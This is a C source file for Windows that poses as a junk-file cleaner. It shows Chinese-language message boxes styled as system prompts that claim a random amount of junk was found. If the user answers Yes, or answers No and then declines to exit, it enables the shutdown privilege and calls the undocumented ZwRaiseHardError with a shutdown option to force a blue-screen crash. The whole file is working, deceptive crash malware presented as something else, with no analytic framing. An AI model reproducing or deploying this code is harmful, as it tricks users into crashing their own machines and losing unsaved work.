#include <Windows.h>
#include <objbase.h>
#include <ShlObj.h> 
#include <stdio.h>
#include <time.h>

#define bool unsigned char
LPCSTR szTitle = "来自系统的提示";


BOOL SetPrivilege(LPCSTR lpPrivilegeName, WINBOOL fEnable)
{
	
	HANDLE hToken; 
	TOKEN_PRIVILEGES NewState; 
	LUID luidPrivilegeLUID; 
 
	
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{ 
		/*If opening token failed...*/
		return FALSE; 
	} 
	
	
	if(fEnable == FALSE) /*We disable all the privileges... */
	{
		if(!AdjustTokenPrivileges(hToken, TRUE, NULL, NULL, NULL, NULL))
		{
			return FALSE;
		}
		else return TRUE;
	}
	/*Look up the LUID value of the privilege... */
	LookupPrivilegeValue(NULL, lpPrivilegeName, &luidPrivilegeLUID);
	
	NewState.PrivilegeCount = 1; 
	NewState.Privileges[0].Luid = luidPrivilegeLUID; 
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	/*Improve this process's privilege, so we can shut down the system next. */
	if(!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))
	{
		return FALSE;
	}
	
	/*We should not only check if the improving was successed... */
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	} 

	return TRUE;
}

typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;
typedef LONG (WINAPI *type_ZwRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, HARDERROR_RESPONSE_OPTION ValidResponseOptions, PULONG Response);

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCH   Buffer;
} UNICODE_STRING;

DWORD WINAPI CallBSoD(void* a)
{
	Sleep(1024);
    UNICODE_STRING str = {8, 10, L"test"};
    ULONG x, args[] = {0x12345678, 0x87654321, (ULONG)&str};
    HMODULE hDll = GetModuleHandle(TEXT("ntdll.dll"));
    type_ZwRaiseHardError ZwRaiseHardError = (type_ZwRaiseHardError)GetProcAddress(hDll, "ZwRaiseHardError");
 	
 	bool bSuccess = SetPrivilege(SE_SHUTDOWN_NAME, TRUE);
    if(bSuccess) ZwRaiseHardError(0xC000021A, 3, 4, args, OptionShutdownSystem, &x);
    
    SetPrivilege(NULL, FALSE);
    return 0;
}

int main(){
	srand(time(0));
	CHAR szBuffer[128];
	sprintf(szBuffer, "检测到 %d MB 垃圾，是否立即清理？", 1 + rand() % 1024);
	
	if(IDYES == MessageBox(NULL,
			   szBuffer,
			   szTitle,
			   MB_ICONINFORMATION | MB_TOPMOST | MB_YESNO | MB_DEFBUTTON1)){
		
		DWORD dwThreadId; 
		CreateThread(NULL, 0, CallBSoD, NULL, 0, &dwThreadId);
		sprintf(szBuffer, "清理中...");
		MessageBox(NULL,
			   szBuffer,
			   szTitle,
			   MB_ICONINFORMATION | MB_TOPMOST | MB_OK);	
	}
	
	
	else {
		sprintf(szBuffer, "不及时清理垃圾会导致电脑变慢，是否仍要退出？");
		if(IDYES ==  MessageBox(NULL,
			   szBuffer,
			   szTitle,
			   MB_ICONINFORMATION | MB_TOPMOST | MB_YESNO | MB_DEFBUTTON2)){
			
			return 0;
			
		}
		else {
			DWORD dwThreadId; 
			CreateThread(NULL, 0, CallBSoD, NULL, 0, &dwThreadId);
			sprintf(szBuffer, "清理中...");
			MessageBox(NULL,
				   szBuffer,
				   szTitle,
				   MB_ICONINFORMATION | MB_TOPMOST | MB_OK);
			
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
			WaitForSingleObject(hThread, INFINITE); 
		}
	}
	return 0;
}


